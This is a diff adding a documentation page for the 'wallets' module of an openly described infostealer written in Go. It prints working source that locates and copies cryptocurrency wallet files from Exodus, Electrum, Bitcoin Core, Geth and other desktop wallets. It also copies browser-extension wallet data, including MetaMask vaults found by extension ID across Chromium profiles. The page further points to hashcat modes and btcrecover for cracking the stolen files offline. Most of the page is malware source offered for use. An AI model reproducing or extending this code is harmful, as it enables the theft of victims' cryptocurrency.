@@ -1,0 +1,572 @@
+---
+title: "Crypto Wallet Extraction"
+description: "Documentation for the wallets module - extracting cryptocurrency wallets from desktop applications and browser extensions"
+---
+
+## Overview
+
+The `wallets` module targets cryptocurrency wallet files from both desktop applications and browser extensions. Most wallets store encrypted data locally that can be extracted for offline cracking or direct import.
+
+<Warning>
+Wallet files are encrypted. This module extracts the encrypted files, not plaintext private keys.
+</Warning>
+
+## Data Structures
+
+### WalletData
+
+```go wallets/wallets.go:32-35
+type WalletData struct {
+    Wallets    []Wallet
+    Extensions []ExtensionWallet
+}
+```
+
+### Wallet (Desktop)
+
+```go wallets/wallets.go:37-42
+type Wallet struct {
+    Name  string
+    Path  string
+    Type  string // "desktop" or "extension"
+    Files []WalletFile
+}
+```
+
+<ParamField path="Name" type="string">
+  Wallet application name (e.g., "Exodus", "Electrum")
+</ParamField>
+
+<ParamField path="Path" type="string">
+  Full path where wallet was found
+</ParamField>
+
+<ParamField path="Files" type="[]WalletFile">
+  Array of extracted wallet files
+</ParamField>
+
+### ExtensionWallet (Browser)
+
+```go wallets/wallets.go:49-54
+type ExtensionWallet struct {
+    Name    string
+    Browser string
+    ExtID   string
+    Data    []byte
+}
+```
+
+## Supported Wallets
+
+### Desktop Wallets
+
+<Tabs>
+  <Tab title="Multi-chain">
+    - **Exodus** - Popular multi-currency wallet
+    - **Atomic Wallet** - Multi-chain wallet
+    - **Jaxx** - Legacy multi-chain wallet
+    - **Coinomi** - Mobile/desktop wallet
+    - **Guarda** - Multi-currency wallet
+  </Tab>
+  <Tab title="Bitcoin Family">
+    - **Bitcoin Core** - Original Bitcoin wallet
+    - **Litecoin Core** - Litecoin wallet
+    - **Dash Core** - Dash wallet
+    - **Electrum** - Lightweight Bitcoin wallet
+    - **Electrum-LTC** - Litecoin variant
+  </Tab>
+  <Tab title="Ethereum">
+    - **Geth** - Official Ethereum client (keystore files)
+  </Tab>
+  <Tab title="Privacy Coins">
+    - **Monero** - XMR wallet files
+    - **Zcash** - ZEC wallet
+    - **Wasabi Wallet** - Privacy-focused Bitcoin
+  </Tab>
+</Tabs>
+
+### Browser Extension Wallets
+
+<Note>
+Extension IDs are consistent across Chromium browsers (Chrome, Edge, Brave, etc.)
+</Note>
+
+```go wallets/wallets.go:92-134
+var extensionWallets = map[string][]string{
+    // The big ones
+    "Metamask":     {"nkbihfbeogaeaoehlefnkodbefgpgknn"},
+    "TronLink":     {"ibnejdfjmmkpcnlpebklmnkoeoihofec"},
+    "BinanceChain": {"fhbohimaelbohpjbbldcngcnapndodjp"},
+    "Coin98":       {"aeachknmefphepccionboohckonoeemg"},
+    "Phantom":      {"bfnaelmomeimhlpmgjnjophhpkkoljpa"}, // solana
+    
+    "TrustWallet":    {"egjidjbpglichdcondbcbdnbeeppgdph"},
+    "CoinbaseWallet": {"hnfanknocfeofbddgcijnmhnfnkdnaad"},
+    "Ronin":          {"fnjhmkhhmkbjkkabndcnnogagogbneec"}, // axie infinity
+    "Exodus":         {"aholpfdialjgjfhomihkjbmgjidlcdno"},
+    // ... 30+ more wallets
+}
+```
+
+## Key Functions
+
+### StealAll()
+
+Main entry point that extracts all wallet data from desktop and browser sources.
+
+```go wallets/wallets.go:149-187
+func StealAll() *WalletData {
+    data := &WalletData{}
+
+    // Desktop wallets first
+    for name, path := range desktopWallets {
+        wallet := stealDesktopWallet(name, path)
+        if wallet != nil {
+            data.Wallets = append(data.Wallets, *wallet)
+        }
+    }
+
+    // Browser extension wallets
+    for browser, basePath := range browserExtPaths {
+        if _, err := os.Stat(basePath); os.IsNotExist(err) {
+            continue
+        }
+
+        profiles := findBrowserProfiles(basePath)
+        for _, profile := range profiles {
+            extPath := filepath.Join(profile, "Local Extension Settings")
+            if _, err := os.Stat(extPath); os.IsNotExist(err) {
+                continue
+            }
+
+            // check each wallet extension
+            for walletName, extIDs := range extensionWallets {
+                for _, extID := range extIDs {
+                    ext := stealExtensionWallet(walletName, browser, extID, extPath)
+                    if ext != nil {
+                        data.Extensions = append(data.Extensions, *ext)
+                    }
+                }
+            }
+        }
+    }
+
+    return data
+}
+```
+
+## Desktop Wallet Extraction
+
+### Exodus Wallet
+
+Exodus stores the seed phrase in `seed.seco` (encrypted with machine-specific key).
+
+```go wallets/wallets.go:238-259
+func grabExodusFiles(basePath string) []WalletFile {
+    var files []WalletFile
+    targets := []string{
+        "passphrase.json", "seed.seco", "info.seco",
+        // also check inside exodus.wallet subfolder
+        filepath.Join("exodus.wallet", "passphrase.json"),
+        filepath.Join("exodus.wallet", "seed.seco"),
+        filepath.Join("exodus.wallet", "info.seco"),
+    }
+
+    for _, target := range targets {
+        fullPath := filepath.Join(basePath, target)
+        if content, err := os.ReadFile(fullPath); err == nil {
+            files = append(files, WalletFile{
+                Name:    target,
+                Content: content,
+            })
+        }
+    }
+
+    return files
+}
+```
+
+<Accordion title="Important Exodus Files">
+- **seed.seco** - Encrypted seed phrase (most valuable)
+- **passphrase.json** - Configuration data
+- **info.seco** - Wallet metadata
+</Accordion>
+
+### Electrum Wallet
+
+Electrum uses JSON wallet files that can be cracked offline with hashcat.
+
+```go wallets/wallets.go:263-292
+func grabElectrumFiles(basePath string) []WalletFile {
+    var files []WalletFile
+
+    entries, err := os.ReadDir(basePath)
+    if err != nil {
+        return files
+    }
+
+    for _, entry := range entries {
+        if entry.IsDir() {
+            continue
+        }
+
+        content, err := os.ReadFile(filepath.Join(basePath, entry.Name()))
+        if err != nil {
+            continue
+        }
+
+        // electrum wallets are valid JSON
+        if json.Valid(content) {
+            files = append(files, WalletFile{
+                Name:    entry.Name(),
+                Content: content,
+            })
+        }
+    }
+
+    return files
+}
+```
+
+### Ethereum Keystore
+
+Geth stores keystore files in UTC format (JSON encrypted with password).
+
+```go wallets/wallets.go:294-322
+func grabKeystoreFiles(basePath string) []WalletFile {
+    var files []WalletFile
+
+    entries, err := os.ReadDir(basePath)
+    if err != nil {
+        return files
+    }
+
+    for _, entry := range entries {
+        if entry.IsDir() {
+            continue
+        }
+
+        // ethereum keystore files start with UTC--
+        if strings.HasPrefix(entry.Name(), "UTC--") {
+            content, err := os.ReadFile(filepath.Join(basePath, entry.Name()))
+            if err != nil {
+                continue
+            }
+
+            files = append(files, WalletFile{
+                Name:    entry.Name(),
+                Content: content,
+            })
+        }
+    }
+
+    return files
+}
+```
+
+### Bitcoin Core wallet.dat
+
+Bitcoin Core and derivatives use `wallet.dat` files (BerkeleyDB format).
+
+```go wallets/wallets.go:356-381
+func grabWalletDatFiles(basePath string) []WalletFile {
+    var files []WalletFile
+
+    filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
+        if err != nil {
+            return nil
+        }
+
+        if info.Name() == "wallet.dat" {
+            content, err := os.ReadFile(path)
+            if err != nil {
+                return nil
+            }
+
+            relPath, _ := filepath.Rel(basePath, path)
+            files = append(files, WalletFile{
+                Name:    relPath,
+                Content: content,
+            })
+        }
+
+        return nil
+    })
+
+    return files
+}
+```
+
+<Note>
+wallet.dat files can be cracked with btcrecover or hashcat mode 11300
+</Note>
+
+### LevelDB Wallets
+
+Some wallets (Atomic, Guarda) use LevelDB for storage.
+
+```go wallets/wallets.go:324-354
+func grabLevelDBFiles(basePath string) []WalletFile {
+    var files []WalletFile
+
+    filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
+        if err != nil {
+            return nil
+        }
+
+        if info.IsDir() {
+            return nil
+        }
+
+        ext := strings.ToLower(filepath.Ext(info.Name()))
+        if ext == ".ldb" || ext == ".log" || info.Name() == "CURRENT" || info.Name() == "MANIFEST" {
+            content, err := os.ReadFile(path)
+            if err != nil {
+                return nil
+            }
+
+            relPath, _ := filepath.Rel(basePath, path)
+            files = append(files, WalletFile{
+                Name:    relPath,
+                Content: content,
+            })
+        }
+
+        return nil
+    })
+
+    return files
+}
+```
+
+## Browser Extension Wallets
+
+### Extension Storage Location
+
+Browser extensions store data in `Local Extension Settings` under each profile.
+
+```go wallets/wallets.go:138-146
+var browserExtPaths = map[string]string{
+    "Chrome":   filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+    "Edge":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+    "Brave":    filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
+    "Opera":    filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
+    "OperaGX":  filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
+    "Vivaldi":  filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
+}
+```
+
+### Metamask Extraction
+
+Metamask stores encrypted vault data in LevelDB. The vault contains encrypted seed phrases.
+
+```go wallets/wallets.go:474-519
+func stealExtensionWallet(name, browser, extID, extPath string) *ExtensionWallet {
+    walletPath := filepath.Join(extPath, extID)
+    if _, err := os.Stat(walletPath); os.IsNotExist(err) {
+        return nil
+    }
+
+    var data []byte
+
+    // grab all LevelDB files
+    filepath.Walk(walletPath, func(path string, info os.FileInfo, err error) error {
+        if err != nil {
+            return nil
+        }
+
+        if info.IsDir() {
+            return nil
+        }
+
+        content, err := os.ReadFile(path)
+        if err != nil {
+            return nil
+        }
+
+        data = append(data, content...)
+        data = append(data, '\n')
+
+        return nil
+    })
+
+    if len(data) == 0 {
+        return nil
+    }
+
+    // extract vault data from metamask-style extensions
+    vaultData := extractVaultData(data)
+    if vaultData != nil {
+        data = vaultData
+    }
+
+    return &ExtensionWallet{
+        Name:    name,
+        Browser: browser,
+        ExtID:   extID,
+        Data:    data,
+    }
+}
+```
+
+### Vault Data Extraction
+
+Extracts the encrypted vault JSON from LevelDB raw data.
+
+```go wallets/wallets.go:521-545
+func extractVaultData(data []byte) []byte {
+    // metamask stores encrypted vault in specific format
+    dataStr := string(data)
+
+    // look for vault patterns
+    patterns := []string{
+        `"vault":"`,
+        `"data":"`,
+        `"KeyringController":`,
+    }
+
+    for _, pattern := range patterns {
+        idx := strings.Index(dataStr, pattern)
+        if idx != -1 {
+            // extract JSON-like structure
+            start := idx
+            end := strings.Index(dataStr[start:], `"`)
+            if end != -1 {
+                return []byte(dataStr[start : start+end+2])
+            }
+        }
+    }
+
+    return nil
+}
+```
+
+## Wallet Paths by Type
+
+### Desktop Wallet Paths
+
+```go wallets/wallets.go:58-87
+var desktopWallets = map[string]string{
+    // Popular multi-chain wallets
+    "Exodus":       filepath.Join(os.Getenv("APPDATA"), "Exodus", "exodus.wallet"),
+    "AtomicWallet": filepath.Join(os.Getenv("APPDATA"), "atomic", "Local Storage", "leveldb"),
+    "Jaxx":         filepath.Join(os.Getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB"),
+    
+    // Bitcoin-family core wallets
+    "Bitcoin":  filepath.Join(os.Getenv("APPDATA"), "Bitcoin", "wallets"),
+    "Litecoin": filepath.Join(os.Getenv("APPDATA"), "Litecoin", "wallets"),
+    "Dash":     filepath.Join(os.Getenv("APPDATA"), "DashCore", "wallets"),
+    
+    // Ethereum
+    "Ethereum": filepath.Join(os.Getenv("APPDATA"), "Ethereum", "keystore"),
+    
+    // Privacy coins
+    "Monero": filepath.Join(os.Getenv("USERPROFILE"), "Documents", "Monero", "wallets"),
+    "Zcash":  filepath.Join(os.Getenv("APPDATA"), "Zcash"),
+}
+```
+
+## Helper Functions
+
+### Find Browser Profiles
+
+```go wallets/wallets.go:547-567
+func findBrowserProfiles(basePath string) []string {
+    var profiles []string
+
+    defaultProfile := filepath.Join(basePath, "Default")
+    if _, err := os.Stat(defaultProfile); err == nil {
+        profiles = append(profiles, defaultProfile)
+    }
+
+    entries, err := os.ReadDir(basePath)
+    if err != nil {
+        return profiles
+    }
+
+    for _, entry := range entries {
+        if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
+            profiles = append(profiles, filepath.Join(basePath, entry.Name()))
+        }
+    }
+
+    return profiles
+}
+```
+
+## Wallet File Formats
+
+<Accordion title="Exodus (.seco)">
+Exodus uses `.seco` files encrypted with a machine-specific key derived from hardware ID.
+- Requires the original machine or hardware fingerprint to decrypt
+- seed.seco contains the BIP39 mnemonic phrase
+</Accordion>
+
+<Accordion title="Electrum (JSON)">
+Electrum wallets are JSON files with encrypted private keys.
+- Can be cracked with hashcat mode 16600
+- Contains wallet type, seed version, and encrypted keystore
+</Accordion>
+
+<Accordion title="Ethereum Keystore (JSON)">
+Standard Web3 keystore format (UTC-- files).
+- Encrypted with scrypt or pbkdf2
+- Hashcat modes: 15700 (scrypt), 15600 (pbkdf2)
+</Accordion>
+
+<Accordion title="wallet.dat (BerkeleyDB)">
+Bitcoin Core and derivatives use BerkeleyDB.
+- Encrypted with AES-256-CBC
+- Hashcat mode 11300
+- Can also use btcrecover tool
+</Accordion>
+
+<Accordion title="Metamask Vault (JSON)">
+Metamask stores encrypted vault in browser local storage.
+- Password required to decrypt
+- Contains encrypted seed phrase and private keys
+- Can be imported into Metamask with password
+</Accordion>
+
+## Extraction Strategy
+
+```go wallets/wallets.go:189-234
+func stealDesktopWallet(name, path string) *Wallet {
+    if _, err := os.Stat(path); os.IsNotExist(err) {
+        return nil
+    }
+
+    wallet := &Wallet{
+        Name: name,
+        Path: path,
+        Type: "desktop",
+    }
+
+    // Different wallets store data differently
+    switch name {
+    case "Exodus":
+        wallet.Files = grabExodusFiles(path)
+    case "Electrum", "Electrum-LTC":
+        wallet.Files = grabElectrumFiles(path)
+    case "Ethereum":
+        wallet.Files = grabKeystoreFiles(path)
+    case "AtomicWallet":
+        wallet.Files = grabLevelDBFiles(path)
+    case "Bitcoin", "Litecoin", "Dash":
+        wallet.Files = grabWalletDatFiles(path)
+    case "Monero":
+        wallet.Files = grabMoneroFiles(path)
+    case "WasabiWallet":
+        wallet.Files = grabWasabiFiles(path)
+    default:
+        // for unknown wallets, just grab everything
+        wallet.Files = grabAllFiles(path)
+    }
+
+    if len(wallet.Files) == 0 {
+        return nil
+    }
+
+    return wallet
+}
+```
